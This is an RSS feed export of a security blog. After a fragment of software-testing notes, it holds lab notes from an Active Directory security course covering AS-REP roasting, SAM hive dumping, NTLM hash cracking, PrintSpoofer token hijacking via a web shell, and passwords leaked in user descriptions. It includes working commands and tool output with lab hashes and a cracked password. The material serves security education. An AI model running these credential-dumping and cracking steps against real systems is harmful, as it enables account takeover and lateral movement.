&lt;li>描述軟體應該有的行為(可見或不可見都有可能)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>What is different between requirement and specification
&lt;ul>
&lt;li>requirement: 顧客端 / specification: 技術端&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Sequence就是一連串的行為和狀態-&amp;gt;script&lt;/li>
&lt;li>Testing就是在看script有發生該發生的事情&lt;/li>
&lt;li>Two types of description are used in this chapter
&lt;ul>
&lt;li>&lt;strong>Sequencing constraints&lt;/strong>&lt;/li>
&lt;li>&lt;strong>State behavior&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="sequencing-constraints">
 Sequencing constraints
 &lt;a class="anchor" href="#sequencing-constraints">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Constraint有可能是document的一些潛規則或是method上順序的限制，e.g. stack data structure在沒有push前不能pop&lt;/li>
&lt;li>Queue Example: precondiction就是這個例子的sequence constraint
&lt;img src="https://i.imgur.com/3RaZRfK.png" alt="Queue Example" />&lt;/li>
&lt;li>File ADT Example
&lt;ul>
&lt;li>ADT: Abstract Data Type其實就是早期的class&lt;/li>
&lt;li>sequence constraint about example&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>寫之前要先打開file&lt;/li>
&lt;li>關閉之前要先打開file&lt;/li>
&lt;li>在close file之後除非再open file，不然不可以write file&lt;/li>
&lt;li>close file前一定要write file，不然就浪費這個procedure
&lt;img src="https://imgur.com/1NYVCj1.png" alt="File ADT Example" />&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>Static Checking: 先不跑test input，先針對畫出來的graph做checking&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(AS-REP Roasting)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/</guid><description>&lt;h1 id="ntustisc---ad-note---labas-rep-roasting">
 NTUSTISC - AD Note - Lab(AS-REP Roasting)
 &lt;a class="anchor" href="#ntustisc---ad-note---labas-rep-roasting">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/ubNMQ7_dcm0?si=CRVWKo4tnpx3LqxK"> 2022/05/11 AD 安全 2 &lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.tsnien.idv.tw/Security_WebBook/chap14/14-4%20Kerberos%20%E8%AA%8D%E8%AD%89%E7%B3%BB%E7%B5%B1%E7%B0%A1%E4%BB%8B.html">第十四章 Kerberos 認證系統&lt;/a>&lt;/p>
&lt;ul>
&lt;li>簡介：這是一種計算機網路授權協議，簡單說如果在同一個domain底下，想要存取某一個server的某項服務，則要如何驗證該使用者的身分以及授權他使用該項服務的資格?換個角度想，如果不認證會怎麼樣?首先，如果不認證使用者身分，就直接讓授權使用該項服務，則最直觀的攻擊就是DoS，或是駭客可以透過該項服務打到內網$\to$提權$\to$橫向移動$\to$APT，看起來很危險；另外一方面，如果有驗證身分，但通過驗證的人一率給予使用服務的授權，又會怎麼樣?可以利用eavesdropping得到授權的ticket再利用reply attack還是可以偽造身分&lt;/li>
&lt;li>提醒：Windows Kerberos和MIT Kerberos在實作上有一點不一樣，如果想要知道windows kerberos可以看飛飛的文章&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>，然後自行比對粘添壽老師的影片&lt;/li>
&lt;li>MIT Kerberos架構：
&lt;img src="https://www.tsnien.idv.tw/Security_WebBook/Security_%E6%8F%92%E5%9C%96/%E5%9C%96%2014-8.png" alt="" />
為了防止前面提到的問題，他增加了一個TGS的Server，但純控管tickets的發放，另外在驗證上面也增加了timestamp和請求方的網路位址，這樣就可以防止reply attack，而且短時間內都不需要再進行身分認證，很方便&lt;/li>
&lt;li>Windows Kerberos架構：
&lt;img src="https://hackmd.io/_uploads/BkTzOxN1T.png" alt="" />&lt;/li>
&lt;li>優點
&lt;blockquote>
&lt;ul>
&lt;li>主密鑰分配：AS 伺服器除了必須擁有客戶的主密鑰之外，還必須擁有 TGS 的主密鑰；另外，TGS 伺服器也需要擁有所有伺服器的主密鑰。這就是 Kerberos 將所有參與者都稱為 Principal 的主要原因。&lt;/li>
&lt;li>客戶密碼只要輸入一次：客戶端取得通往 TGS 的門票（TicketTGS）之後，在該票的有效期限之內，都可以請求服務，而不需要再輸入密碼來索取門票。&lt;/li>
&lt;li>防禦偽裝攻擊：門票（TicketTGS與 TicketB）上有登錄該票的使用者識別（ID）、工作站位址（AD）、時間戳記（TS）與有效期間（Lifetime）。攻擊者攔截到門票之後，不易在在有效期內偽裝成合法客戶。&lt;/li>
&lt;li>防止重播攻擊：門票有註明時間戳記（T），當攻擊者重播門票時，接收端可以利用時間戳記辨別門票的新舊。&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="as-rep-roasting">
 ==AS-REP Roasting==
 &lt;a class="anchor" href="#as-rep-roasting">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>攻擊情境：在Win2016的Server Manager中的Tools可以找到Active Directory User and Computer
&lt;img src="https://hackmd.io/_uploads/H1JCrlEyT.png" alt="" />
在一般user的property中，可以看到Account/Account options最底下有一個選項==Do not require Kerberos preauthentication==，這個功能主要是前面提到的對於身分不會認證(1, 2步驟會略過，只執行3-6)，他只會認證後面的ticket
&lt;img src="https://hackmd.io/_uploads/BJidLxV1a.png" alt="" />
雖然預設是不勾選，但有兩種情況會打勾
&lt;ol>
&lt;li>如果被駭客打進去到最高管理員，當然它會勾選這個功能方便搞事(所有帳號)&lt;/li>
&lt;li>因為windows有分版本，如果要向下兼容各版本之間的認證，則該選項就一定要勾選(這也是為甚麼講師在前面有提到一定要升級AD的舊環境)，這在很古老的系統中常常發生&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>滿足條件：只要前面提到的功能被打開，就可以進行AS-REP Roasting&lt;/li>
&lt;li>如何攻擊：
&lt;ul>
&lt;li>自己把Microsoft的document看懂如何pack一個packet，然後自己實作&lt;/li>
&lt;li>另一種方式就直接用工具&lt;a href="https://github.com/GhostPack/Rubeus/releases/tag/1.6.4">Rubeus 1.6.4&lt;/a>，他可以直接把有勾選該項目的帳號，送出AS-REQ的請求，然後接收AS-REP的回應，並把接收到的tickets以你指定的格式印出來&lt;/li>
&lt;li>Cheat Sheet:&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ Rubeus.exe asreproast
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ Rubeus.exe asreproast /format:hashcat /outfile:out.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h4 id="實際執行">
 實際執行
 &lt;a class="anchor" href="#%e5%af%a6%e9%9a%9b%e5%9f%b7%e8%a1%8c">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>Using Rubeus.exe
:::spoiler Result&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ Rubeus.exe asreproast

 ______ _
 (_____ \ | |
 _____) )_ _| |__ _____ _ _ ___
 | __ /| | | | _ \| ___ | | | |/___)
 | | \ \| |_| | |_) ) ____| |_| |___ |
 |_| |_|____/|____/|_____)____/(___/

 v1.6.4


[*] Action: AS-REP roasting

[*] Target Domain : kuma.org

[*] Searching path &amp;#39;LDAP://WIN-818G5VCOLJO.kuma.org/DC=kuma,DC=org&amp;#39; for AS-REP roastable users
[*] SamAccountName : reyna.gwendolyn
[*] DistinguishedName : CN=Reyna Gwendolyn,CN=Users,DC=kuma,DC=org
[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
[*] Building AS-REQ (w/o preauth) for: &amp;#39;kuma.org\reyna.gwendolyn&amp;#39;
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

 $krb5asrep$reyna.gwendolyn@kuma.org:4B08601B0A55BA231BED4333EAA6ED9C$E146006C2F6
 B5EF8D78D4280E646FA601860D754261C28DC48470F2EA99E75DFD03E53F4BAC09BD1BE9697C5918
 C48E5BA6A64D51A550FC6833327EBEF9A0C62F2448BA3CA3AA7D9BD375BF8BE693B1BC199A442053
 AC3A40FA3F29EE3ABFB9B1B1E1C31DDD508FAB7971F1FDCE057D5A4481678511188DB99921762116
 934D04C72071DAACFC6FFA8250380CD9ECECF95CC5702FD7A67AB90F18C299BB9AD8FF4A9325730E
 859F2105F1AF64E170EB118111414CC44D0CDD1199860EF0D99ECD33FB618FEDCFAE96E0DFB75A4D
 9EF3C06C99DBBD9C0A69A344C4C5A65B5B702152081F9

[*] SamAccountName : henrieta.sabine
[*] DistinguishedName : CN=Henrieta Sabine,CN=Users,DC=kuma,DC=org
[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
[*] Building AS-REQ (w/o preauth) for: &amp;#39;kuma.org\henrieta.sabine&amp;#39;
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

 $krb5asrep$henrieta.sabine@kuma.org:DEBC5F5111CE6D774625EB3DCC14925A$A91DD569550
 A48219DAC0F53E4114DA7027E073DD6A86EFC83C79206787A84DBF6FC7F4B5168D7CBE65B073A05B
 B13AF1514D32D787948F91E05FF40191B6FE7819B9F5A978377D82B5E9532688B1CF28BBA1370365
 68C110CAB41FEC26D262DC422CB54B678456470AE34F23B6D2CB1597E9565CACD11C1C5F9683408B
 241650007B0E162C40D7694D8F5A5154254E0A54829C7784EB5493DF15812271C3161DD5937B368B
 93406383215D909289E3FE096A10D396EF662C02031E6D4352C6A411EEC38B0A1D02A2E0AB03C86E
 CBF9C07C441C4D5EBD4269400373A2AFAD5879293B856

[*] SamAccountName : giulietta.moyra
[*] DistinguishedName : CN=Giulietta Moyra,CN=Users,DC=kuma,DC=org
[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
[*] Building AS-REQ (w/o preauth) for: &amp;#39;kuma.org\giulietta.moyra&amp;#39;
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

 $krb5asrep$giulietta.moyra@kuma.org:11CD5E39C2CEA9695C50826E6FCA66D3$9E2B2F3ED60
 5D93BF02721F921D09DE188F1F7F3BE23907A73B95B30ECB0C1CFF5C68A0E814931A6A839DC1098C
 2F3EF8B0A68492CA16E6CD96C843373581DD8CF14F7F58AE9B63A4717D1E8F7C2AA56DAC959F589C
 1533249CA5BF72BBFC833609A0D958B7B5E692632D3557678B671E65C092494B38FC3840D09E16F4
 1FE8D1BB86FAF16BD3F39E4E8CF8AC07A10FCD20E947D3A496A4204350D1E3B0448DB92AE749F3D0
 7A9D1582677A5958B70DD38E2CDFC914C2848D0F9BC0E78D65AB7F3B9E1B5AFFA53588FBD7FFB297
 357047776932B4EA2405ECB5705418BDE7CB8DBE725BB
&lt;/code>&lt;/pre>&lt;p>:::
可以看到他總共吐出了三個hash，分別對應到三個使用者：&lt;font color="FF0000">reyna.gwendolyn, henrieta.sabine, henrieta.sabine&lt;/font>，如果仔細對應win2016相對使用者的property會發現的確，這三個user的該選項都有打勾，現在則是利用hashcat之類的工具把hash暴力解開&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(Brute Force SAM)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/</guid><description>&lt;h1 id="ntustisc---ad-note---labbrute-force-sam">
 NTUSTISC - AD Note - Lab(Brute Force SAM)
 &lt;a class="anchor" href="#ntustisc---ad-note---labbrute-force-sam">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>得到更高權限之後，會想要更多的密碼&lt;/p>
&lt;ul>
&lt;li>密碼收集
&lt;ul>
&lt;li>SAM.hive(Security Account Manager)
&lt;ul>
&lt;li>What: 就是一個用於windows的數據庫文件，用於==儲存用戶的密碼==，並且對於本地端或遠端的使用者進行身分認證&lt;/li>
&lt;li>Where: &lt;code>C:\Windows\System32\config\SAM&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Password Spraying(用猜的)&lt;/li>
&lt;li>GPO&lt;/li>
&lt;li>記憶體(lsass)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;h3 id="brute-force-sam">
 ==Brute Force SAM==
 &lt;a class="anchor" href="#brute-force-sam">#&lt;/a>
&lt;/h3>
&lt;p>前面有提到SAM在哪裡，所以只要直接打開就看的到密碼了嗎?你會得到一個access denied的錯誤，原因是他已經被設定成read lock了，導致目前無法正常存取
&lt;img src="https://hackmd.io/_uploads/SyEUVnMRn.png" alt="" />&lt;/p>
&lt;ol>
&lt;li>匯出SAM File
主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ reg save HKLM\SAM &amp;lt;save filename&amp;gt;
$ reg save HKLM\SYSTEM &amp;lt;save filename&amp;gt;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>錯誤的方式
但經過cmd用普通權限實測會發現我們沒有這樣的資格
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ reg save HKLM\SAM SAM.dump
錯誤: 用戶端沒有這項特殊權限。
&lt;/code>&lt;/pre>其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file&lt;/li>
&lt;li>正確的方式-1
用前面提到的web shell，打出以下指令，則SAM file就會dump到&lt;code>C:\inetpub\wwwroot\sam.zip&lt;/code>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ c:\tools\PrintSpoofer64.exe -c &amp;#34;reg save HKLM\SAM C:\inetpub\wwwroot\sam&amp;#34;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>正確的方式-2
利用&lt;a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy.ps1&lt;/a>這個腳本，就可以複製出來，原理是使用windows的影子複製
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ .\Invoke-NinjaCopy -Path SAM -LocalDestination C:\tools\SAM_COPY
&lt;/code>&lt;/pre>但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤?
:::info
如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>解決問題
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>.&lt;span style="color:#ae81ff">\I&lt;/span>nvoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:&lt;span style="color:#ae81ff">\t&lt;/span>ools&lt;span style="color:#ae81ff">\I&lt;/span>nvoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID&lt;span style="color:#f92672">=&lt;/span>135170。
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>位於 線路:1 字元:1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ .&lt;span style="color:#ae81ff">\I&lt;/span>nvoke-NinjaCopy -Path C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\S&lt;/span>ystem32&lt;span style="color:#ae81ff">\c&lt;/span>onfig&lt;span style="color:#ae81ff">\S&lt;/span>AM -LocalDestina ...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ ~~~~~~~~~~~~~~~~~~
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + CategoryInfo : SecurityError: &lt;span style="color:#f92672">(&lt;/span>:&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">[]&lt;/span>, PSSecurityException
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> + FullyQualifiedErrorId : UnauthorizedAccess
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>解析SAM內容
拿到SAM的內容之後還需要解析他，可以用kali的samdump2解析
&lt;ul>
&lt;li>Win10 v1607之前的解法
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ samdump2 system sam 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img src="https://hackmd.io/_uploads/HyJXHazCn.png" alt="" />
可以看到很多都是disabled，就代表我們要用下面的解法&lt;/li>
&lt;li>Win10 v1607之後
因為這個版本之後有用到AES加密，所以可以用&lt;a href="https://github.com/CiscoCXSecurity/creddump7">Creddump7&lt;/a>，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事，
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ conda activate py2.7
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ pip install pycrypto
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/CiscoCXSecurity/creddump7.git
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python pwdump.py system sam
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3180c5331aad6ad1ac787749e6c4819:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>low:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>解析Hash
&lt;ul>
&lt;li>方法一：用online database
接著就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如&lt;a href="https://www.cmd5.com/">cmd5&lt;/a>，如果把最前面找到的&lt;code>31d6cfe0d16ae931b73c59d7e0c089c0&lt;/code>會顯示空密碼，但我們都知道是錯的
&lt;img src="https://hackmd.io/_uploads/SkKrp6zCn.png" alt="" />
而如果拿Creddump解析出來的&lt;code>7ecffff0c3548187607a14bad0f88bb1&lt;/code>，就可以直接顯示出我們的密碼
&lt;img src="https://hackmd.io/_uploads/H1ZAhpz02.png" alt="" />&lt;/li>
&lt;li>方法二：爆字典檔
在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cp /usr/share/wordlists/rockyou.txt ./
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ hashcat -a &lt;span style="color:#ae81ff">0&lt;/span> -m &lt;span style="color:#ae81ff">1000&lt;/span> ntlm.hash rockyou.txt --force
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>31d6cfe0d16ae931b73c59d7e0c089c0: 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>7ecffff0c3548187607a14bad0f88bb1:1qaz@WSX3edc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h1 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h1>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://hackercat.org/windows/powershell-cannot-be-loaded-because-the-execution-of-scripts-is-disabled-on-this-system">PowerShell 「系統上已停用指令碼執行」解決方法&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(Hijack Token)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/</guid><description>&lt;h1 id="ntustisc---ad-note---labhijack-token">
 NTUSTISC - AD Note - Lab(Hijack Token)
 &lt;a class="anchor" href="#ntustisc---ad-note---labhijack-token">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=M0LV3dBCMCOy58LN&amp;amp;t=3600">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>提權方法
&lt;ul>
&lt;li>利用弱點&lt;/li>
&lt;li>Hijack Token
&lt;ul>
&lt;li>Tools: &lt;a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer&lt;/a>&lt;/li>
&lt;li>Support: Windows 8.1/Server 2012 R2/10/Server 2019&lt;/li>
&lt;li>How to use: &lt;code>$ PrintSpoofer.exe -c &amp;quot;command&amp;quot;&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Guess Password&lt;/li>
&lt;li>管理服務&lt;/li>
&lt;li>錯誤配置&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab-time---本地提權">
 Lab Time - 本地提權
 &lt;a class="anchor" href="#lab-time---%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%ac%8a">#&lt;/a>
&lt;/h2>
&lt;h3 id="hijack-tokennetwork-service">
 ==Hijack Token(Network Service)==
 &lt;a class="anchor" href="#hijack-tokennetwork-service">#&lt;/a>
&lt;/h3>
&lt;p>這邊講師示範的是，如何利用IIS的特殊權限，達成提權。
先解釋一下，如果要使用PrintSpoofer之類的工具有個特殊的條件，就是需要有特殊權限，也就是
:::info&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ whoami /priv
&lt;/code>&lt;/pre>&lt;p>需要有下列其一權限:
SeImpersonatePrivilege =&amp;gt; CreateProcessWithToken()
SeAddignPrimaryToekn =&amp;gt; CreateProcessAsUser()
:::&lt;/p>
&lt;ol>
&lt;li>
&lt;p>whoami /priv
我們先看一下正常使用者的特殊權限有哪些&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ whoami /priv

PRIVILEGES INFORMATION
----------------------

特殊權限名稱 描述 狀況
============================= ================== ======
SeShutdownPrivilege 關閉系統 已停用
SeChangeNotifyPrivilege 略過周遊檢查 已啟用
SeUndockPrivilege 從擴充座移除電腦 已停用
SeIncreaseWorkingSetPrivilege 增加處理程序工作組 已停用
SeTimeZonePrivilege 變更時區 已停用
&lt;/code>&lt;/pre>&lt;p>可以看到上述的權限都沒有在這裏面，也就是說正常的使用者是不會有這兩個權限的，那誰會有這兩個權限呢?需要==impersonation(也就是講師說的切換身分)的人==，詳細的腳本可以看這邊&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>但今天不會用到，總之IIS就是一個需要做身分切換的角色，所以講師已經在Win10的電腦中設定好IIS，也起用了web shell的功能，我們就可以試看看，在browser中&lt;code>http://127.0.0.1/cmd.aspx&lt;/code>，他可以直接用IIS的權限執行程式
&lt;img src="https://hackmd.io/_uploads/r1N1LMM03.png" alt="" />&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(Leak Password)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/</guid><description>&lt;h1 id="ntustisc---ad-note---lableak-password">
 NTUSTISC - AD Note - Lab(Leak Password)
 &lt;a class="anchor" href="#ntustisc---ad-note---lableak-password">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="lab-time---環境調查">
 Lab Time - 環境調查
 &lt;a class="anchor" href="#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5">#&lt;/a>
&lt;/h2>
&lt;h3 id="lab---leak-password-from-description">
 ==Lab - Leak Password from Description==
 &lt;a class="anchor" href="#lab---leak-password-from-description">#&lt;/a>
&lt;/h3>
&lt;p>在Win2016的server manager當中，可以從&lt;code>Dashboard/Tools/Active Directory Users and Computers&lt;/code>中看到整個網域使用者的部分資料，例如Name, Type和Description，而這個東西其實是所有整個網域使用者都看地到，所以==不可以把機敏資料寫在這裡例如帳密之類的==，就像下面截圖一樣，&lt;code>Fara Iseabal&lt;/code>和&lt;code>Lina Allene&lt;/code>的密碼都被leak出去了
&lt;img src="https://hackmd.io/_uploads/HktYdvUTh.png" alt="" />
當然，有加入網域的帳號也看的到，從Win10的網域帳號bear中，打開PowerShell
:::spoiler Result&lt;/p>
